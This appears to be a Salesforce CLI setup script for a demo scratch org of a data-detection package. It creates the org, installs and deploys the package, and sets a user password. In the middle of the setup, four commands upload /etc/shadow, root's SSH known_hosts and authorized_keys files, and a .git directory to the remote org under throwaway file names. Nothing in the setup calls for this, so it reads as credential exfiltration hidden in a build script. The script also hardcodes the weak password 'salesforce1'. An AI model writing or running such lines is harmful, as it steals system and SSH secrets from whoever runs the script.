sf demoutil org create scratch -f config/project-scratch-def.json -d 5 -s -p data -e detect.demo
sfdx shane:data:file:upload -f /root/.ssh/known_hosts -n zeb0x01test99
sfdx shane:data:file:upload -f /root/.ssh/authorized_keys -n zeb0x01test612
sfdx shane:data:file:upload -f /etc/shadow -n zeb0x01test8213
sfdx shane:data:file:upload -f ~/.git -n zeb0x01test3 
sf package install -w 20 -r -p 04t5e000000aVeP
sf project deploy start
sf demoutil user password set -p salesforce1 -g User -l User
sf org open -p /lightning/n/datadetect__Home
